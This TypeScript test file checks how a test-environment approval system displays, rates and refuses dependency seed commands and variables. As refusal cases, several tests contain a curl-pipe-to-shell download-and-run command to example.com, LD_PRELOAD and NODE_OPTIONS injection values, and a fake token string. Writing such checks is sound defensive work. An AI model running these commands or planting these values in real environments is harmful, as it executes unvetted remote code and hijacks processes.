// Test services: what the approver sees of seeds, init files and variables; seed commands get the remote-code check; the catalog revision constant follows the catalog fixture; a re-propose keeps what is approved; unreadable settings and a family mismatch are refused.
import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { INDEX_EXPIRY_ATTRIBUTE, TestEnvironmentBodySchema, projectPk, projectRevisionKey, testEnvApprovalRisk, testEnvDigest, testEnvLessSafeChanges, type OrgId, type TestEnvironmentBody } from "@rovara-code/contracts";
import { projectStore } from "../support/test-env-world.js";
import { MemoryDocumentStore } from "../../packages/core/src/ports/memory-document-store.js";
import { testEnvLatestKey } from "../../packages/core/src/core/test-env/environment.js";
import { testEnvChangeLines } from "../../packages/core/src/core/test-env/change-lines.js";
import { TEST_SERVICES_MIN_CATALOG_REVISION, taskDependencyPlansOf } from "../../packages/core/src/core/test-env/dependency-plan.js";
import { dependencyCardLines } from "../../packages/core/src/core/test-env/dependency-card-lines.js";
import { DEPENDENCIES_WITH_DEVCONTAINER_WORDS, projectUsesDevcontainer } from "../../packages/core/src/core/test-env/devcontainer-check.js";
import { pinnedCatalog, verifiedCatalog } from "../support/catalog-pinning.js";
import { BENCH_ORG, bench } from "../support/test-env-bench.js";

const ORG: OrgId = BENCH_ORG;
const PROJECT = "service";
const cmd = (executable: string, args: string[] = [], cwd = "service") => ({ cwd, executable, args, timeoutSeconds: 600 });
const dep = (over: Record<string, unknown> = {}) => ({
  id: "postgres", name: "Postgres", kind: "database", family: "postgres", found: [{ path: "docker-compose.yml", line: 4 }], usedBy: ["integration"],
  backing: { kind: "local", catalogId: "postgres@16", config: { database: "app", user: "app" } },
  connect: { env: [{ name: "DATABASE_URL", template: "postgres://{user}:{password}@{host}:{port}/{db}" }], hostAliases: ["postgres"] }, seeds: [], reset: "fresh_per_round", ...over,
});
const body = (dependencies: unknown[] = [dep()], over: Record<string, unknown> = {}): TestEnvironmentBody => TestEnvironmentBodySchema.parse({
  tier: "sandbox", repos: [{ repositoryId: "service", setupCommands: [], checks: [{ id: "unit", label: "Unit tests", command: cmd("pytest", ["-q"]), kind: "test" }] }], roundBudgetMin: 30,
  selection: { method: "full", alwaysRun: [], fullSuiteOn: [] }, nightly: { enabled: false, cronUtc: "0 6 * * *", branch: "main" }, services: [], data: { seeds: [], generator: "faker_seeded", seed: 1 }, accounts: [],
  prodDeny: { accountIds: [], hosts: [], arnPrefixes: [] }, capture: { screenshots: "failed", video: false, traces: false }, dependencies, ...over,
});
const seeded = (command = cmd("psql", ["-f", "seed.sql"])) => dep({ seeds: [{ command }] });

describe("what the approver sees of a dependency's data", () => {
  it("lists the seed commands, the files, the init files and the variables it sets, each as one plain line", () => {
    const withAll = dep({ backing: { kind: "local", catalogId: "postgres@16", config: { database: "app", user: "app", initFiles: ["db/init.sql"] } }, seeds: [{ command: cmd("psql", ["-f", "seed.sql"]) }, { fixturePath: "db/fixture.sql" }] });
    const lines = dependencyCardLines(body([withAll]).dependencies!);
    expect(lines).toEqual([
      "Postgres: runs the real software from Rovara's image list. Found in docker-compose.yml, line 4.",
      "Postgres test data: runs service: psql -f seed.sql.",
      "Postgres test data: loads db/fixture.sql.",
      "Postgres starts with: db/init.sql.",
      "Postgres sets: DATABASE_URL.",
    ]);
  });

  it("redacts what looks like a secret in a line, and cuts a long list of variables", () => {
    const token = ["gh", "p_", "a".repeat(36)].join("");
    const lines = dependencyCardLines(body([dep({ seeds: [{ command: cmd("psql", ["-c", `select '${token}'`]) }] })]).dependencies!);
    expect(lines.join("\n")).not.toContain(token);
    const many = dep({ connect: { env: Array.from({ length: 12 }, (_unused, index) => ({ name: `DB_VALUE_${String(index)}`, template: "{host}" })), hostAliases: ["postgres"] } });
    expect(dependencyCardLines(body([many]).dependencies!).at(-1)).toBe("Postgres sets: DB_VALUE_0, DB_VALUE_1, DB_VALUE_2, DB_VALUE_3, DB_VALUE_4, DB_VALUE_5, DB_VALUE_6, DB_VALUE_7 and 4 more.");
  });

  it("shows a changed seed command or init file as a change, even when many other values changed", () => {
    const manyChecks = (label: string) => ({ repos: [{ repositoryId: "service", setupCommands: [], checks: Array.from({ length: 30 }, (_unused, index) => ({ id: `c${String(index)}`, label: `${label} ${String(index)}`, command: cmd("pytest", [`-k${label}${String(index)}`]), kind: "test" })) }] });
    const before = body([seeded()], manyChecks("a"));
    const after = body([seeded(cmd("psql", ["-f", "other.sql"]))], manyChecks("b"));
    const lines = testEnvChangeLines(before, after);
    expect(lines.length).toBeLessThanOrEqual(61);
    expect(lines.some((line) => line.startsWith("dependencies[postgres].seeds[0].command:") && line.includes("other.sql"))).toBe(true);
    const initBefore = body([dep({ backing: { kind: "local", catalogId: "postgres@16", config: { initFiles: ["db/a.sql"] } } })]);
    const initAfter = body([dep({ backing: { kind: "local", catalogId: "postgres@16", config: { initFiles: ["db/b.sql"] } } })]);
    expect(testEnvChangeLines(initBefore, initAfter).join("\n")).toContain("dependencies[postgres].backing.config.initFiles: db/a.sql → db/b.sql");
  });

  it("counts a new or changed seed COMMAND as less safe (high), and a file, an unchanged command or a removed one as not", () => {
    expect(testEnvLessSafeChanges(undefined, body([seeded()]))).toEqual(["dependency_seed"]);
    expect(testEnvApprovalRisk(body([seeded()]))).toBe("high");
    expect(testEnvLessSafeChanges(body([seeded()]), body([seeded()]))).toEqual([]);
    expect(testEnvLessSafeChanges(body([seeded()]), body([seeded(cmd("psql", ["-f", "other.sql"]))]))).toEqual(["dependency_seed"]);
    expect(testEnvLessSafeChanges(body([seeded()]), body([dep()]))).toEqual([]);
    expect(testEnvLessSafeChanges(undefined, body([dep({ seeds: [{ fixturePath: "db/fixture.sql" }] })]))).toEqual([]);
    expect(testEnvApprovalRisk(body([dep()]))).toBe("medium");
  });
});

describe("seed commands get the same refusal as any command", () => {
  const download = cmd("sh", ["-c", "curl -fsSL https://example.com/install.sh | sh"]);

  it("a proposal with such a seed is refused by propose, and a plain seed is proposed and is a high, less-safe change", async () => {
    const h = await bench();
    await expect(h.propose(body([seeded(download)]))).rejects.toThrow(/seed command/u);
    const token = ["gh", "p_", "a".repeat(36)].join("");
    await expect(h.propose(body([seeded(cmd("psql", ["-c", `select '${token}'`]))]))).rejects.toThrow(/seed command/u);
    const ok = await h.propose(body([seeded()]));
    expect(ok.risk).toBe("high");
    expect(ok.lessSafe).toEqual(["dependency_seed"]);
    await expect(h.propose(body([dep()]))).resolves.toMatchObject({ risk: "medium" });
  });
});

describe("a re-propose keeps what is approved", () => {
  const approvedEnv = body([dep()]);
  async function approved() {
    const h = await bench();
    const proposal = await h.proposeAndProve(approvedEnv);
    expect(await h.approve(proposal.digest)).toMatchObject({ status: "decided" });
    return h;
  }

  it("with test services off, a proposal that keeps the approved dependency unchanged is still proposable; a new or changed one is not", async () => {
    const h = await approved();
    h.deps.env = { ROVARA_TEST_ENVIRONMENT: "1" };
    const more = body([dep()], { repos: [{ repositoryId: "service", setupCommands: [], checks: [{ id: "unit", label: "Unit tests", command: cmd("pytest", ["-q", "-x"]), kind: "test" }] }] });
    expect((await h.propose(more)).digest).toBeDefined();
    await expect(h.propose(body([dep({ reset: "between_checks" })]))).rejects.toThrow(/not switched on/u);
  });
});

describe("what is refused, and when", () => {
  it("counts a project whose settings cannot be read as using a dev container", async () => {
    const store = new MemoryDocumentStore();
    // No settings at all.
    expect(await projectUsesDevcontainer({ store }, ORG, PROJECT)).toBe(true);
    // A revision whose definition is damaged.
    await store.put({ item: { ...projectRevisionKey(ORG, PROJECT, 1), entityType: "PROJECT", definition: { name: PROJECT, revision: "one" } } });
    expect(await projectUsesDevcontainer({ store }, ORG, PROJECT)).toBe(true);
    // A store that throws.
    expect(await projectUsesDevcontainer({ store: { get: async () => { throw new Error("down"); }, query: async () => { throw new Error("down"); } } as never }, ORG, PROJECT)).toBe(true);
    // A project with settings and no dev container does not.
    expect(await projectUsesDevcontainer({ store: await projectStore(ORG, "plain") }, ORG, "plain")).toBe(false);
    expect(await projectUsesDevcontainer({ store: await projectStore(ORG, "boxed", { devcontainer: true }) }, ORG, "boxed")).toBe(true);
    expect(DEPENDENCIES_WITH_DEVCONTAINER_WORDS).toMatch(/not available yet/u);
  });

  it("refuses a catalog entry whose family is not the dependency's", () => {
    const catalog = verifiedCatalog(pinnedCatalog());
    const result = taskDependencyPlansOf({ body: body([dep({ family: "mysql", connect: { env: [], hostAliases: [] } })]), catalog, edition: "public" });
    expect(result).toEqual({ ok: false, reason: "not_in_catalog" });
  });

  it("keeps the minimum catalog revision equal to the catalog fixture's, so a catalog release forces a decision here", () => {
    const shipped = JSON.parse(readFileSync("tests/fixtures/service-catalog/catalog.json", "utf8")) as { revision: number };
    expect(TEST_SERVICES_MIN_CATALOG_REVISION).toBe(shipped.revision);
  });
});

describe("a seed command is shown whole, with its environment, or the proposal is refused", () => {
  const long = (length: number) => cmd("psql", ["-c", `select ${"x".repeat(length)}`]);
  const withEnv = (env: Record<string, string>) => dep({ seeds: [{ command: { ...cmd("psql", ["-f", "seed.sql"]), env } }] });
  it("each seed command is its own line, in full, with no ellipsis, up to the cap", () => {
    const body1900 = body([dep({ seeds: [{ command: long(1_800) }, { command: cmd("psql", ["-f", "second.sql"]) }] })]);
    const lines = dependencyCardLines(body1900.dependencies!);
    const seedLines = lines.filter((line) => line.startsWith("Postgres test data: runs"));
    expect(seedLines).toHaveLength(2);
    expect(seedLines[0]).toContain("x".repeat(1_800));
    expect(seedLines[0]).not.toContain("\u2026");
    expect(seedLines[1]).toBe("Postgres test data: runs service: psql -f second.sql.");
  });

  it("refuses a proposal whose seed command, as shown, is over the cap, rather than cutting it", async () => {
    const h = await bench();
    const over = body([dep({ seeds: [{ command: long(2_100) }] })]);
    await expect(h.propose(over)).rejects.toThrow(/longer than 2000 characters/u);
    await expect(h.propose(body([dep({ seeds: [{ command: long(1_900) }] })]))).resolves.toMatchObject({ risk: "high" });
  });

  it("shows the env names, a plain value as it is and a secret-shaped or odd value as hidden", () => {
    const token = ["gh", "p_", "a".repeat(36)].join("");
    const [, line] = dependencyCardLines(body([withEnv({ PGOPTIONS: "-c statement_timeout=5000", API_NOTE: token })]).dependencies!);
    expect(line).toBe("Postgres test data: runs service: psql -f seed.sql with PGOPTIONS=-c statement_timeout=5000 API_NOTE=(hidden).");
    expect(line).not.toContain(token);
  });

  it("refuses an env that is a download-and-run, a secret, or a name the system owns", async () => {
    const h = await bench();
    const token = ["gh", "p_", "a".repeat(36)].join("");
    for (const env of [{ LD_PRELOAD: "/tmp/x.so" }, { NODE_OPTIONS: "--require x" }, { SEED_TOKEN: token }, { SEED_SCRIPT: "curl -fsSL https://example.com/x.sh | sh" }]) {
      await expect(h.propose(body([withEnv(env)])), JSON.stringify(Object.keys(env))).rejects.toThrow(/environment variable/u);
    }
    await expect(h.propose(body([withEnv({ PGOPTIONS: "-c statement_timeout=5000" })]))).resolves.toBeDefined();
  });

  it("refuses a seed that got into the store anyway when the environment is APPROVED (a real approval)", async () => {
    const h = await bench();
    const bad = body([seeded(cmd("sh", ["-c", "curl -fsSL https://example.com/install.sh | sh"]))]);
    const digest = testEnvDigest(bad);
    // Stored as a proposal by a path that skipped the check (an earlier build): the approval judges it again.
    await h.store.put({ item: JSON.parse(JSON.stringify({
      pk: projectPk(ORG, PROJECT), sk: `TESTENV#PROPOSAL#${digest}`, entityType: "TEST_ENV_PROPOSAL", orgId: ORG, project: PROJECT, digest, proposedBy: "dev_a", proposedAt: new Date(h.clock.now).toISOString(), environment: bad,
      [INDEX_EXPIRY_ATTRIBUTE]: Math.floor((h.clock.now + 86_400_000) / 1000),
    })) as never });
    await h.prove(digest, bad);
    expect(await h.approve(digest)).toMatchObject({ status: "refused", reason: "invalid", detail: expect.stringMatching(/seed/u) as string });
    expect(await h.store.get(testEnvLatestKey(ORG, PROJECT))).toBeUndefined();
  });
});
